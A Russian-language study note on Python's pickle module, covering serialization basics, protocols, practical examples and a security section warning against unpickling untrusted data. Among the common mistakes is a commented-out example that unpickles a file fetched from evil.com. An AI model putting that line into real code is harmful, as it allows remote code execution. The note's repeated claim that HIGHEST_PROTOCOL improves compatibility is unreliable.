---
tags:
  - python
  - тема/файлы_и_потоки
  - тема/сериализация
  - статус/завершён
---

# 🥒 Модуль Pickle

## 📌 Коротко

> Pickle — встроенный модуль для сериализации (преобразование в байты) и десериализации Python объектов. Поддерживает почти все типы Python, но опасен для ненадежных данных из интернета.

---

## 💡 Полезные советы

- **Используйте бинарный режим** — `'wb'` и `'rb'` обязательны!
- **Pickle опасен для веб** — никогда не загружайте pickle из интернета!
- **Для обмена данными используйте JSON** — более безопасно и универсально
- **`protocol=pickle.HIGHEST_PROTOCOL`** — используйте для лучшей совместимости
- **Класс должен быть определён на верхнем уровне** — иначе не десериализуется
- **Обрабатывайте исключения** — `UnpicklingError`, `EOFError` при загрузке
- **Сохраняйте всё в памяти** — нет частичной десериализации при ошибке

---

## 🚀 Быстрая справка

| Функция | Назначение | Работает с | Пример |
|---|---|---|---|
| `pickle.dump(obj, file)` | Сериализует в файл | Объект → файл | `pickle.dump(data, f)` |
| `pickle.dumps(obj)` | Сериализует в bytes | Объект → bytes | `b = pickle.dumps(data)` |
| `pickle.load(file)` | Десериализует из файла | Файл → объект | `data = pickle.load(f)` |
| `pickle.loads(bytes)` | Десериализует из bytes | Bytes → объект | `data = pickle.loads(b)` |

---

## 📖 Теория

### Что такое Pickle?

**Pickle** — встроенный модуль Python для преобразования объектов в байтовый поток и обратно.

**Сериализация (pickling)** — преобразование объекта в байты для сохранения/передачи
**Десериализация (unpickling)** — восстановление объекта из байтов

```python
data = [1, 2, 3, 'hello']
# Сериализация
pickled = pickle.dumps(data)  # b'\x80\x04\x95\x0f\x00\x00...'
# Десериализация
restored = pickle.loads(pickled)  # [1, 2, 3, 'hello']
```

**Использование:**
- ✅ Сохранение состояния (save/load game)
- ✅ Кэширование результатов вычислений
- ✅ Обмен данными внутри приложения (между процессами)
- ✅ Сохранение моделей ML (временно)

**НЕ использовать:**
- ❌ Веб-данные (от клиента/из интернета)
- ❌ Обмен с другими языками программирования
- ❌ Долгосрочное хранение (может быть несовместимым в будущих версиях Python)

### Что можно сериализовать?

```python
# ✅ Все встроенные типы
int, float, str, bool, None
list, tuple, dict, set, frozenset
bytes, bytearray

# ✅ Функции и классы (определённые на верхнем уровне модуля)
# ✅ Экземпляры классов
# ✅ Вложенные структуры данных

# ❌ Нельзя сериализовать
# Открытые файлы, сетевые соединения, потоки, лямбда-функции
```

### Протоколы сериализации

Pickle поддерживает разные протоколы для совместимости с разными версиями Python:

| Протокол | Версия Python | Формат | Описание |
|---|---|---|---|
| 0 | 1.x | ASCII | Читаемый, совместимый, медленный |
| 1 | 1.x | Бинарный | Старый формат |
| 2 | 2.3+ | Бинарный | Улучшенный |
| 3 | 3.0+ | Бинарный | Быстрее, не совместим с Python 2 |
| 4 | 3.4+ | Бинарный | Поддержка больших объектов |
| 5 | 3.8+ | Бинарный | Самый быстрый, самый новый |

**Рекомендация:** используйте `pickle.HIGHEST_PROTOCOL` для лучшей совместимости.

---

## 💾 Сохранение и загрузка

### Способ 1: В файл (dump/load)

```python
import pickle

# СОХРАНЕНИЕ
data = {'name': 'Alice', 'age': 30, 'scores': [85, 90, 95]}

with open('data.pkl', 'wb') as file:  # ⚠️ БИНАРНЫЙ режим!
    pickle.dump(data, file)

# С указанием протокола
with open('data.pkl', 'wb') as file:
    pickle.dump(data, file, protocol=pickle.HIGHEST_PROTOCOL)

# ЗАГРУЗКА
with open('data.pkl', 'rb') as file:  # ⚠️ БИНАРНЫЙ режим!
    loaded_data = pickle.load(file)
    
print(loaded_data)  # {'name': 'Alice', 'age': 30, 'scores': [85, 90, 95]}
```

### Способ 2: В память (dumps/loads)

```python
import pickle

data = [1, 2, 3, 4, 5]

# Сериализация в bytes
pickled = pickle.dumps(data)
print(type(pickled))  # <class 'bytes'>

# Десериализация из bytes
restored = pickle.loads(pickled)
print(restored)  # [1, 2, 3, 4, 5]
```

### Способ 3: Несколько объектов в один файл

```python
import pickle

# Сохранение нескольких объектов
with open('data.pkl', 'wb') as f:
    pickle.dump([1, 2, 3], f)
    pickle.dump({'key': 'value'}, f)
    pickle.dump('Hello', f)

# Загрузка в том же порядке
with open('data.pkl', 'rb') as f:
    list_data = pickle.load(f)
    dict_data = pickle.load(f)
    str_data = pickle.load(f)
    
print(list_data, dict_data, str_data)
# [1, 2, 3] {'key': 'value'} Hello
```

---

## 💻 Практические примеры

### Сохранение состояния игры

```python
import pickle

# Состояние игры
game_state = {
    'level': 5,
    'score': 12500,
    'inventory': ['sword', 'shield', 'potion'],
    'position': (10, 25),
    'health': 100,
    'mana': 50
}

# Сохранение
with open('savegame.pkl', 'wb') as f:
    pickle.dump(game_state, f)

# Загрузка
with open('savegame.pkl', 'rb') as f:
    loaded = pickle.load(f)
    print(f"Уровень: {loaded['level']}")
    print(f"Очки: {loaded['score']}")
```

### Кэширование вычислений

```python
import pickle
import os

def expensive_calculation(n):
    """Дорогостоящее вычисление"""
    return sum(i**2 for i in range(n))

def get_with_cache(n, cache_file='cache.pkl'):
    """Получить результат с кэшированием"""
    
    # Загрузить старый кэш если существует
    cache = {}
    if os.path.exists(cache_file):
        with open(cache_file, 'rb') as f:
            try:
                cache = pickle.load(f)
            except pickle.UnpicklingError:
                print("Кэш повреждён, начинаем заново")
                cache = {}
    
    # Проверить кэш
    if n in cache:
        print(f'✅ Загружено из кэша: {n}')
        return cache[n]
    
    # Вычислить и сохранить
    print(f'⏳ Вычисляю: {n}')
    result = expensive_calculation(n)
    cache[n] = result
    
    # Сохранить кэш
    with open(cache_file, 'wb') as f:
        pickle.dump(cache, f)
    
    return result

print(get_with_cache(1000000))  # Вычисляет
print(get_with_cache(1000000))  # Из кэша
```

### Работа с пользовательскими классами

```python
import pickle

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
    
    def __repr__(self):
        return f'Person({self.name}, {self.age})'
    
    def greet(self):
        return f'Hello, I am {self.name}'

# Создаём объект
person = Person('Bob', 25)
print(person.greet())  # Hello, I am Bob

# Сериализуем
with open('person.pkl', 'wb') as f:
    pickle.dump(person, f)

# Десериализуем
with open('person.pkl', 'rb') as f:
    loaded = pickle.load(f)

print(loaded)  # Person(Bob, 25)
print(loaded.greet())  # Hello, I am Bob
```

### Глубокое копирование через pickle

```python
import pickle

# Глубокое копирование сложной структуры
original = {
    'list': [1, 2, [3, 4]],
    'dict': {'nested': {'deep': 42}}
}

# Способ 1: через pickle
deep_copy = pickle.loads(pickle.dumps(original))

# Способ 2: через copy.deepcopy (обычно быстрее)
import copy
deep_copy2 = copy.deepcopy(original)

# Изменяем копию, оригинал не меняется
deep_copy['list'][2][0] = 999
print(original)  # Не изменился
print(deep_copy)  # Изменился
```

---

## ⚠️ Безопасность — КРИТИЧНО!

### ❌ НИКОГДА не загружайте pickle из ненадежных источников!

```python
import pickle

# ОПАСНО! Pickle может выполнять произвольный Python код при десериализации
# Никогда не делайте это с файлами из интернета, от клиентов или неизвестных источников!

try:
    with open('untrusted.pkl', 'rb') as f:
        data = pickle.load(f)  # МОЖЕТ выполнить вредоносный код!
except Exception as e:
    print(f"Ошибка при загрузке: {e}")

# ✅ Используйте JSON для обмена данными
import json

data = {'safe': 'data'}
with open('safe.json', 'w') as f:
    json.dump(data, f)  # Безопасно!

with open('safe.json', 'r') as f:
    data = json.load(f)  # Безопасно!
```

**Почему pickle опасен?**
- Pickle может выполнять произвольный Python код при десериализации
- Злоумышленник может создать вредоносный pickle-файл
- Нет способа проверить pickle перед загрузкой

**Когда Pickle безопасен?**
- ✅ Вы создали файл сами
- ✅ Файл с защитой доступа (только вы можете читать)
- ✅ Внутреннее использование в вашем приложении
- ✅ Вы полностью доверяете источнику

---

## ⚠️ Частые ошибки

```python
import pickle

# ❌ Ошибка 1: Забыли бинарный режим
try:
    with open('data.pkl', 'w') as f:  # ❌ ТЕКСТОВЫЙ режим!
        pickle.dump([1, 2, 3], f)
except TypeError:
    print("Нужен бинарный режим 'wb'!")

# ✅ Правильно
with open('data.pkl', 'wb') as f:  # ✅ БИНАРНЫЙ режим
    pickle.dump([1, 2, 3], f)

# ❌ Ошибка 2: Не обработали исключение
try:
    with open('corrupted.pkl', 'rb') as f:
        data = pickle.load(f)  # Может вызвать ошибку
except pickle.UnpicklingError:
    print("Ошибка десериализации!")
except EOFError:
    print("Файл пуст или неполный!")
except FileNotFoundError:
    print("Файл не найден!")

# ❌ Ошибка 3: Класс не определён на верхнем уровне
def create_class():
    class LocalClass:
        pass
    return LocalClass()

obj = create_class()
try:
    pickle.dumps(obj)  # Может не работать!
except Exception as e:
    print(f"Вложенный класс: {e}")

# ✅ Определите на верхнем уровне модуля
class TopLevelClass:
    pass

obj = TopLevelClass()
data = pickle.dumps(obj)  # OK

# ❌ Ошибка 4: Используете pickle для веб-данных
# Приложение получает pickle из браузера
# user_data = pickle.loads(request.data)  # ❌ ОПАСНО!

# ✅ Используйте JSON
import json
# user_data = json.loads(request.data)  # ✅ БЕЗОПАСНО

# ❌ Ошибка 5: Загружаете из интернета
# data = pickle.loads(requests.get('http://evil.com/data.pkl').content)  # ❌ ОПАСНО!
```

---

## 📝 Шпаргалка

```python
import pickle

# СОХРАНЕНИЕ В ФАЙЛ
with open('data.pkl', 'wb') as f:
    pickle.dump(data, f)

# ЗАГРУЗКА ИЗ ФАЙЛА
with open('data.pkl', 'rb') as f:
    data = pickle.load(f)

# СЕРИАЛИЗАЦИЯ В BYTES
bytes_data = pickle.dumps(data)

# ДЕСЕРИАЛИЗАЦИЯ ИЗ BYTES
data = pickle.loads(bytes_data)

# С ОБРАБОТКОЙ ОШИБОК
try:
    with open('data.pkl', 'rb') as f:
        data = pickle.load(f)
except FileNotFoundError:
    print("Файл не найден")
except pickle.UnpicklingError:
    print("Ошибка десериализации")
except EOFError:
    print("Файл пуст")
```

---

## 🔗 Связанные темы

- [[04_JSON|04 — JSON (безопаснее для веб-данных)]]
- [[01_Работа_с_текстовыми_файлами|01 — Работа с текстовыми файлами]]
- [[Модуль copy — глубокое копирование]]

## ❓ Вопросы / Непонятное
